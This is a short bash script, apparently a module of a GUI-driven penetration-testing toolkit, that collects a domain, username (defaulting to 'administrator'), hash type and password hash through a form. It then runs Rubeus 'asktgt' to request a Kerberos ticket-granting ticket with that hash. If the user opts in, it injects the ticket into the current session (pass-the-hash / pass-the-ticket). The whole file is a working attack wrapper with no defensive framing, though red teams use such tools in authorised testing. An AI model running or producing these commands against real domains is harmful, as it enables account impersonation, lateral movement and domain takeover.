#!/bin/bash

: '
Rubeus: get tgt ticket
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
DOMAIN_FIELD=$(form_item  "domain" "domain")
USERNAME_FIELD=$(form_item  "username" "username" "administrator")
HASH_TYPE_FIELD=$(form_item  "hash type" "select" "hash_type" "rc4" "rc4|aes128|aes256|des")
HASH_FIELD=$(form_item  "hash" "hash")
IMPORT_TGT_TICKET_FIELD=$(form_item  "import tgt ticket" "select" "import_tgt_ticket" "yes" "yes|no")

# Generate GUI form
generate_form "${DOMAIN_FIELD}" "${USERNAME_FIELD}" "${HASH_TYPE_FIELD}" "${HASH_FIELD}" "${IMPORT_TGT_TICKET_FIELD}"

DOMAIN=${form_data["domain"]}
USERNAME=${form_data["username"]}
HASH_TYPE=${form_data["hash_type"]}
HASH=${form_data["hash"]}
IMPORT_TGT_TICKET=${form_data["import_tgt_ticket"]}

ptt="/nowrap"
if [[ "${IMPORT_TGT_TICKET}" == "yes" ]]; then
    ptt="/ptt"
fi

execute_command "Rubeus.exe  asktgt /domain:${DOMAIN} /user:${USERNAME} /${HASH_TYPE}:${HASH} ${ptt}"
create_new_line
